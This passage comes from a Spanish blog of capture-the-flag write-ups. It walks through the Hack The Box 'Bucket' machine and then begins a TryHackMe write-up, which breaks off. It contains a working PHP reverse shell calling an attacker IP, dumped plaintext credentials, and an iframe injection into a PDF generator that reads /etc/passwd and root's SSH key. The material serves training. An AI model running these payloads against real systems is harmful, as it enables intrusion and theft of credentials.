FULL_CONTROL del bucket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3api get-bucket-acl --bucket adserver --endpoint-url http://s3.bucket.htb { \u0026#34;Owner\u0026#34;: { \u0026#34;DisplayName\u0026#34;: \u0026#34;webfile\u0026#34;, \u0026#34;ID\u0026#34;: \u0026#34;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a\u0026#34; }, \u0026#34;Grants\u0026#34;: [ { \u0026#34;Grantee\u0026#34;: { \u0026#34;ID\u0026#34;: \u0026#34;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a\u0026#34;, \u0026#34;Type\u0026#34;: \u0026#34;CanonicalUser\u0026#34; }, \u0026#34;Permission\u0026#34;: \u0026#34;FULL_CONTROL\u0026#34; } ] } Al tener este permiso permite al usuario:\nPermiso Permite en el Bucket FULL_CONTROL Allows grantee the READ, WRITE, READ_ACP, and WRITE_ACP permissions on the bucket De tal forma que podriamos listar los archivos que existen en el bucket.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver PRE images/ 2021-03-19 20:45:11 5344 index.html ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver/images/ 2021-03-19 20:53:12 37840 bug.jpg 2021-03-19 20:53:12 51485 cloud.png 2021-03-19 20:53:12 16486 malware.png Además podemos subir archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(kali㉿kali)-[~/htb/bucket] └─$ cat me.php \u0026lt;?php echo \u0026#34;s3 bucket adserver\u0026#34;; ?\u0026gt; ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 cp me.php --endpoint-url http://s3.bucket.htb s3://adserver/me.php upload: ./me.php to s3://adserver/me.php ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver/ PRE images/ 2021-03-19 20:57:13 5344 index.html 2021-03-19 20:57:38 36 me.php ┌──(kali㉿kali)-[~/htb/bucket] └─$ curl -s -X GET http://bucket.htb/me.php s3 bucket adserver Sabiendo que podemos subir archivos, subimos una shell inversa con la cual logramos obtener una shell con el usuario www-data.\n1 \u0026lt;?php $sock=fsockopen(\u0026#34;10.10.14.178\u0026#34;,1445);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes); ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/htb/bucket] └─$ nc -lvp 1445 listening on [any] 1445 ... connect to [10.10.14.178] from bucket.htb [10.10.10.212] 45404 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@bucket:/var/www/html$ pwd pwd /var/www/html DYNAMODB \u0026gt; USER Dentro de los procesos encontramos que dynamodb esta siendo ejecutado, además vemos algunos puertos corriendo localmente, ingestigamos acerca del archivo jar especificado en el proceso y encontramos que es dynamodb y que puede ser accedido atraves del cli de aws: AWS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [... REDACTED ...] root 1758 1688 0 Mar19 ? 00:00:24 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -sharedDb -port 60571 -inMemo ry [... REDACTED ...] www-data@bucket:/tmp$ netstat -ntpl netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4566 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:46305 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - Verificamos que aws cli estuviera instalado en la maquina, tambien configuramos nuestras credenciales y nuestra variable $HOME para que aws tuviera permisos de escritura.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 www-data@bucket:/tmp$ which aws which aws /usr/bin/aws www-data@bucket:/tmp$ aws dynamodb list-tables --endpoint-url http://localhost:8000 \u0026lt;db list-tables --endpoint-url http://localhost:8000 You must specify a region. You can also configure your region by running \u0026#34;aws configure\u0026#34;. www-data@bucket:/tmp$ aws configure AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE [... REDACTED ...] [Errno 13] Permission denied: \u0026#39;/var/www/.aws\u0026#39; www-data@bucket:/tmp$ export HOME=/dev/shm export HOME=/dev/shm www-data@bucket:/tmp$ echo $HOME echo $HOME /dev/shm www-data@bucket:/tmp$ aws configure aws configure AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE AKIAIOSFODNN7EXAMPLE AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY Default region name [None]: us-west-2 us-west-2 Default output format [None]: json json www-data@bucket:/tmp$ Intentamos realizar un query a dynamo localmente a los diferentes puertos con lo que logramos observar las tablas existentes y descripcion, además logramos obtener credenciales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 www-data@bucket:/tmp$ aws dynamodb list-tables --endpoint-url http://localhost:4566 \u0026lt;db list-tables --endpoint-url http://localhost:4566 { \u0026#34;TableNames\u0026#34;: [ \u0026#34;users\u0026#34; ] } www-data@bucket:/tmp$ aws dynamodb describe-table --table-name users --endpoint-url http://localhost:4566 \u0026lt;ble-name users --endpoint-url http://localhost:4566 { \u0026#34;Table\u0026#34;: { \u0026#34;AttributeDefinitions\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; }, { \u0026#34;AttributeName\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; } ], \u0026#34;TableName\u0026#34;: \u0026#34;users\u0026#34;, \u0026#34;KeySchema\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;HASH\u0026#34; }, { \u0026#34;AttributeName\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;RANGE\u0026#34; } ], \u0026#34;TableStatus\u0026#34;: \u0026#34;ACTIVE\u0026#34;, \u0026#34;CreationDateTime\u0026#34;: 1616193915.52, \u0026#34;ProvisionedThroughput\u0026#34;: { \u0026#34;LastIncreaseDateTime\u0026#34;: 0.0, \u0026#34;LastDecreaseDateTime\u0026#34;: 0.0, \u0026#34;NumberOfDecreasesToday\u0026#34;: 0, \u0026#34;ReadCapacityUnits\u0026#34;: 5, \u0026#34;WriteCapacityUnits\u0026#34;: 5 }, \u0026#34;TableSizeBytes\u0026#34;: 107, \u0026#34;ItemCount\u0026#34;: 3, \u0026#34;TableArn\u0026#34;: \u0026#34;arn:aws:dynamodb:us-east-1:000000000000:table/users\u0026#34; } } www-data@bucket:/tmp$ aws dynamodb scan --table-name users --endpoint-url http://localhost:4566 \u0026lt;ble-name users --endpoint-url http://localhost:4566 { \u0026#34;Items\u0026#34;: [ { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Management@#1@#\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Mgmt\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Welcome123!\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Cloudadm\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;n2vM-\u0026lt;_K_Q:.Aa2\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Sysadm\u0026#34; } } ], \u0026#34;Count\u0026#34;: 3, \u0026#34;ScannedCount\u0026#34;: 3, \u0026#34;ConsumedCapacity\u0026#34;: null } www-data@bucket:/tmp$ 1 2 3 Mgmt:Management@#1@# Cloudadm:Welcome123! Sysadm:n2vM-\u0026lt;_K_Q:.Aa2 Utilizamos una de las contraseñas para escalar al usuario roy lo cual funcionó, logramos obtener una shell y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@bucket:/tmp$ su roy su roy Password: n2vM-\u0026lt;_K_Q:.Aa2 roy@bucket:/tmp$ cd cd roy@bucket:~$ ls ls project user.txt roy@bucket:~$ cat user.txt cat user.txt 8c89a136f4f790b62af13feac9760790 roy@bucket:~$ PRIVILEGE ESCALATION PSPY Utilizamos pspy para ver los cronjobs que son ejecutados y observamos que el usuario root elimina archivos en la carpeta de \u0026ldquo;objetos\u0026rdquo; del bucket adsever, basicamente restaura archivos y el estado del bucket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 2021/03/20 01:49:01 CMD: UID=0 PID=819089 | /usr/sbin/CRON -f 2021/03/20 01:49:01 CMD: UID=0 PID=819088 | rm /var/www/bucket-app/files/* 2021/03/20 01:49:01 CMD: UID=0 PID=819087 | /bin/sh -c rm /var/www/bucket-app/files/* 2021/03/20 01:49:01 CMD: UID=0 PID=819086 | /usr/sbin/CRON -f 2021/03/20 01:49:01 CMD: UID=0 PID=819085 | /usr/sbin/CRON -f 2021/03/20 01:49:01 CMD: UID=0 PID=819090 | /bin/bash /root/sync.sh 2021/03/20 01:49:01 CMD: UID=0 PID=819092 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 sync s3://adserver/ /root/files/ --exclude *.png --exclude *.jpg 2021/03/20 01:49:01 CMD: UID=0 PID=819104 | 2021/03/20 01:49:02 CMD: UID=0 PID=819105 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 rm s3://adserver --recursive 2021/03/20 01:49:02 CMD: UID=0 PID=819106 | /lib/systemd/systemd-udevd 2021/03/20 01:49:02 CMD: UID=0 PID=819125 | /bin/bash /root/restore.sh 2021/03/20 01:49:03 CMD: UID=0 PID=819129 | /bin/bash /root/restore.sh 2021/03/20 01:49:03 CMD: UID=0 PID=819130 | 2021/03/20 01:49:03 CMD: UID=0 PID=819133 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 sync /root/backups/ s3://adserver 2021/03/20 01:49:04 CMD: UID=0 PID=819134 | 2021/03/20 01:49:04 CMD: UID=0 PID=819154 | cp -R /root/backups/index.html /var/www/html/ 2021/03/20 01:49:04 CMD: UID=0 PID=819155 | /usr/bin/php /root/restore.php DYNAMODB \u0026gt; PD4CMD \u0026gt; SSH ROOT En los archivos del bucket, al inicio del archivo index.php encontramos que este puede recibir peticiones POST especificamente los datos action=get_alerts lo cual crearía una nueva conexion con DynamoDB y, obtendría los datos de la tabla alerts por titulo (title) y que este ultimo contenga el valor Ransomware, luego, realizaría un for para obtener la informacion individual (fila[data]) con lo que crearía un archivo con un nombre random dentro de la carpeta file/, al finalizar ejecuta pd4ml (html a pdf) para crear un archivo con el nombre result.pdf.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 roy@bucket:/var/www/bucket-app$ cat index.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;]===\u0026#34;POST\u0026#34;) { if($_POST[\u0026#34;action\u0026#34;]===\u0026#34;get_alerts\u0026#34;) { date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); $client = new DynamoDbClient([\u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39;]); $iterator = $client-\u0026gt;getIterator(\u0026#39;Scan\u0026#39;, array(\u0026#39;TableName\u0026#39; =\u0026gt; \u0026#39;alerts\u0026#39;, \u0026#39;FilterExpression\u0026#39; =\u0026gt; \u0026#34;title = :title\u0026#34;, \u0026#39;ExpressionAttributeValues\u0026#39; =\u0026gt; array( \u0026#34;:title\u0026#34;=\u0026gt;array(\u0026#34;S\u0026#34;=\u0026gt;\u0026#34;Ransomware\u0026#34;) ), )); foreach ($iterator as $item) { $name=rand(1,10000).\u0026#39;.html\u0026#39;; file_put_contents(\u0026#39;files/\u0026#39;.$name,$item[\u0026#34;data\u0026#34;]); } passthru(\u0026#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\u0026#34;); } }else{ ?\u0026gt; Ya que este proceso es ejecutado por el usuario root podriamos aprovecharnos ya que crearia archivos html y estos los \u0026ldquo;ejecutaria\u0026rdquo;, en estos archivos podriamos leer archivos utilizando etiquetas como \u0026lt;iframe\u0026gt; u \u0026lt;object\u0026gt;.\nPrimero debemos de crear la tabla alerts la cual no existe.\n1 2 3 4 5 6 aws dynamodb create-table \\ --table-name alerts \\ --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \\ --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \\ --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 \\ --endpoint-url http://localhost:4566 Ingresamos la informacion a la tabla con nuestro \u0026ldquo;payload\u0026rdquo; para lectura del archivo /etc/passwd.\n1 2 3 aws dynamodb put-item \\ --table-name alerts \\ --item \u0026#39;{\u0026#34;title\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;Ransomware\u0026#34;}, \u0026#34;data\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;iframe src=/etc/passwd width=1000 height=400 frameborder=0 \u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;} }\u0026#39; Copiamos los archivos que se encuentran en /var/www/bucket-app/files/ a nuestra carpeta principal y luego a nuestra maquina, vemos que el archivo pdf logró realizar la lectura del archivo /etc/passwd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ┌──(kali㉿kali)-[~/htb/bucket] └─$ pdftotext result.pdf result.txt ┌──(kali㉿kali)-[~/htb/bucket] └─$ cat result.txt root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/s news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management :/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemdtimesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM soft :/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin roy:x:1 :/home/roy:/bin/bash pd4ml evaluation copy. visit http://pd4ml.com Hay que mencionar que el anterior proceso se realizo de manera rapida y conjunta ya que existe un cron que restaura la carpeta y el bucket, además elimina los archivos creados en /var/www/bucket-app/files/, por lo que se utilizaron dos consolas.\n1 2 3 4 5 #CONSOLA 1 aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://localhost:4566 \u0026amp;\u0026amp; sleep 1 \u0026amp;\u0026amp; aws dynamodb put-item --table-name alerts --item \u0026#39;{\u0026#34;title\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;Ransomware\u0026#34;}, \u0026#34;data\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;iframe src=/etc/passwd width=1000 height=400\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;} }\u0026#39; --endpoint-url http://localhost:4566 #CONSOLA 2 aws dynamodb scan --table-name alerts --endpoint-url http://localhost:4566 \u0026amp;\u0026amp; curl -s -d \u0026#34;action=get_alerts\u0026#34; http://localhost:8000/ \u0026amp;\u0026amp; sleep 2 \u0026amp;\u0026amp; ls -lah /var/www/bucket-app/files/ \u0026amp;\u0026amp; cp /var/www/bucket-app/files/* $HOME/ \u0026amp;\u0026amp; sleep 1 \u0026amp;\u0026amp; ls -lah Utilizamos los mismos comandos pero esta vez para obtener la clave privada del usuario root que posiblemente se encuentra en /root/.ssh/id_rsa. Luego de obtener el pdf logramos leer la clave privada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(kali㉿kali)-[~/htb/bucket] └─$ pdftotext it.pdf it.txt ┌──(kali㉿kali)-[~/htb/bucket] └─$ cat it.txt -----BEGIN OPENSSH PRIVATE KEY----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU bQr/unofKrmgNMAhjmrHCiMapmDw1dcyj4PSPtwo6IvrV0Guyu34Law1Eav9sV1hgzDLm8 [... REDACTED ...] ZhpVP0sGJN6uKIvg9p4SD6X8JBdwCtTP8AAADBAOBYuz8OdgDKw5OzZxWeBq80+n0yXUeZ EtZFCf5z4q4laryzqyyPxUEOPTxpABbmnQjOq6clMtTnJhgAf/THSKnsGb8RABLXG/KSAh pHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/ lt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1 xMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg== -----END OPENSSH PRIVATE KEY----- pd4ml evaluation copy. visit http://pd4ml.com Utilizamos firefox para leer y guardar la clave ya que pdftotext no toma la clave privada entera, utilizamos esta ultima para obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Last login: Tue Feb 9 14:39:03 2021 root@bucket:~# whoami;id;pwd;hostname root uid=0(root) gid=0(root) groups=0(root) /root bucket root@bucket:~# ls backups docker-compose.yml files restore.php restore.sh root.txt snap start.sh sync.sh root@bucket:~# cat root.txt e342e395617f10eadab82946c523be28 root@bucket:~# root@bucket:~# root@bucket:~# cat /home/roy/user.txt 693f688d2bcb2488ab3dafaaafc1380a root@bucket:~# ","description":"Bucket es una maquina de HackTheBox, encontramos un S3 con mala configuracion de autenticacion donde subimos una shell inversa en PHP. Encontramos DynamoDB localmente con credenciales para realizar movimiento lateral. Para la escalada de privilegios aprovechamos que Pd4Cmd genera PDFs con informacion de DynamoDB, en este ultimo insertamos HTML para obtener la clave privada de SSH de root. ","id":68,"section":"posts","tags":["s3","aws","dynamodb","gobuster","Pd4Cmd"],"title":"Hack The Box - Bucket","uri":"https://sckull.github.io/posts/bucket/"},{"content":"\rDifferent CTF es una maquina de TryHackMe, encontramos dos versiones de WordPres y vemos un reto de Esteganografia donde encontramos credenciales para el servicio FTP el cual nos dio acceso a PhpMyAdmin. En este ultimo modificamos las credenciales de los usuarios de ambas bases de datos de WordPress, además modificamos variables que nos permitio subir una shell inversa. Realizamos movimiento lateral creando un wordlist personalizado y realizamos ataque a contraseñas con sucrack. Para escalar privilegios encontramos una pista que nos permitió obtener las credenciales para root.\nRoom Titulo Different CTF Descripción interesting room, you can shoot the sun Puntos 150 Dificultad Dificil Maker hakanbey01 NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # Nmap 7.91 scan initiated Mon Apr 19 20:35:16 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.200.139 Warning: 10.10.200.139 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.200.139 (10.10.200.139) Host is up (0.31s latency). Not shown: 37023 closed ports, 28510 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http # Nmap done at Mon Apr 19 20:38:02 2021 -- 1 IP address (1 host up) scanned in 166.18 seconds # Nmap 7.91 scan initiated Mon Apr 19 21:12:24 2021 as: nmap -sC -sV -oN serviceports 10.10.200.139 Nmap scan report for adana.thm (10.10.200.139) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: WordPress 5.6 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Hello World \u0026amp;#8211; Just another WordPress site Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Apr 19 21:13:10 2021 -- 1 IP address (1 host up) scanned in 45.87 seconds HTTP Vemos un dominio de redireccion en la pagina principal, el cual agregamos a nuestro archivo /etc/hosts.\n1 2 3 4 5 HTTP/1.1 200 OK Date: Tue, 20 Apr 2021 00:55:24 GMT Server: Apache/2.4.29 (Ubuntu) Link: \u0026lt;http://adana.thm/index.php/wp-json/\u0026gt;; rel=\u0026#34;https://api.w.org/\u0026#34; Content-Type: text/html; charset=UTF-8 Al visitar el puerto 80 vemos que esta corriendo wordpress.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos. Vemos directorios que no son comunes: announcements y phpmyadmin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ╭─kali@kali ~/thm/differentctf ╰─➤ gohttp http://adana.thm/ /announcements (Status: 301) [Size: 314] [--\u0026gt; http://adana.thm/announcements/] /index.php (Status: 301) [Size: 0] [--\u0026gt; http://adana.thm/] /index.php (Status: 301) [Size: 0] [--\u0026gt; http://adana.thm/] /javascript (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/javascript/] /license.txt (Status: 200) [Size: 19915] /phpmyadmin (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/phpmyadmin/] /readme.html (Status: 200) [Size: 7278] /server-status (Status: 403) [Size: 274] /wp-admin (Status: 301) [Size: 309] [--\u0026gt; http://adana.thm/wp-admin/] /wp-blog-header.php (Status: 200) [Size: 0] /wp-includes (Status: 301) [Size: 312] [--\u0026gt; http://adana.thm/wp-includes/] /wp-content (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/wp-content/] /wp-load.php (Status: 200) [Size: 0] /wp-links-opml.php (Status: 200) [Size: 224] /wp-mail.php (Status: 403) [Size: 2672] /wp-settings.php (Status: 500) [Size: 0] /wp-trackback.php (Status: 200) [Size: 135] /wp-login.php (Status: 200) [Size: 6544] /wp-config.php (Status: 200) [Size: 0] /wp-cron.php (Status: 200) [Size: 0] /wp-signup.php (Status: 302) [Size: 0] [--\u0026gt; http://adana.thm/wp-login.php?action=register] /xmlrpc.php (Status: 405) [Size: 42] /xmlrpc.php (Status: 405) [Size: 42] WPSCAN Tambien enumeramos plugins, temas y usuarios utilizando wpscan. Encontramos un usuario y la version desactualizada de wordpress.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [+] WordPress version 5.6 identified (Outdated, released on 2020-12-08). | Found By: Rss Generator (Passive Detection) | - http://adana.thm/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; | - http://adana.thm/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; [+] hakanbey01 | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://adana.thm/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) Observamos en /announcements/ dos archivos, un \u0026ldquo;wordlist\u0026rdquo; y una imagen.\nEn /phpmyadmin vemos el panel de logeo de este administrador.\nSTEGANOGRAPHY Utilizamos stegcracker con la imagen y wordlist encontrados, obtenemos credenciales para el servicio ftp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ╭─kali@kali ~/thm/differentctf ╰─➤ stegcracker austrailian-bulldog-ant.jpg wordlist.txt [... REDACTED ...] Counting lines in wordlist.. Attacking file \u0026#39;austrailian-bulldog-ant.jpg\u0026#39; with wordlist \u0026#39;wordlist.txt\u0026#39;.. Successfully cracked file with password: 123adanaantinwar Tried 49380 passwords Your file has been written to: austrailian-bulldog-ant.jpg.out 123adanaantinwar ╭─kali@kali ~/thm/differentctf ╰─➤ cat austrailian-bulldog-ant.jpg.out RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s= ╭─kali@kali ~/thm/differentctf ╰─➤ cat austrailian-bulldog-ant.jpg.out|base64 -d FTP-LOGIN USER: hakanftp PASS: NOTAPASSWORD FTP - HAKANFTP Ingresamos por el servicio FTP donde encontramos los archivos de wordpress, obtuvimos los archivos .bash_history y wp-config.php. Intentamos escribir un archivo para ejecucion de comandos pero tal parece que la carpeta no esta realacionada al wordpress del puerto 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 8 1001 1001 4096 Jan 15 12:26 . drwxrwxrwx 8 1001 1001 4096 Jan 15 12:26 .. -rw------- 1 1001 1001 88 Jan 13 11:06 .bash_history drwx------ 2 1001 1001 4096 Jan 11 10:29 .cache drwx------ 3 1001 1001 4096 Jan 11 10:29 .gnupg -rw-r--r-- 1 1001 1001 554 Jan 10 22:26 .htaccess drwxr-xr-x 2 0 0 4096 Jan 14 16:49 announcements -rw-r--r-- 1 1001 1001 405 Feb 06 2020 index.php -rw-r--r-- 1 1001 1001 19915 Feb 12 2020 license.txt -rw-r--r-- 1 1001 1001 7278 Jun 26 2020 readme.html -rw-r--r-- 1 1001 1001 7101 Jul 28 2020 wp-activate.php drwxr-xr-x 9 1001 1001 4096 Dec 08 22:13 wp-admin -rw-r--r-- 1 1001 1001 351 Feb 06 2020 wp-blog-header.php -rw-r--r-- 1 1001 1001 2328 Oct 08 2020 wp-comments-post.php -rw-r--r-- 1 0 0 3194 Jan 11 09:55 wp-config.php drwxr-xr-x 4 1001 1001 4096 Dec 08 22:13 wp-content -rw-r--r-- 1 1001 1001 3939 Jul 30 2020 wp-cron.php drwxr-xr-x 25 1001 1001 12288 Dec 08 22:13 wp-includes -rw-r--r-- 1 1001 1001 2496 Feb 06 2020 wp-links-opml.php -rw-r--r-- 1 1001 1001 3300 Feb 06 2020 wp-load.php -rw-r--r-- 1 1001 1001 49831 Nov 09 10:53 wp-login.php -rw-r--r-- 1 1001 1001 8509 Apr 14 2020 wp-mail.php -rw-r--r-- 1 1001 1001 20975 Nov 12 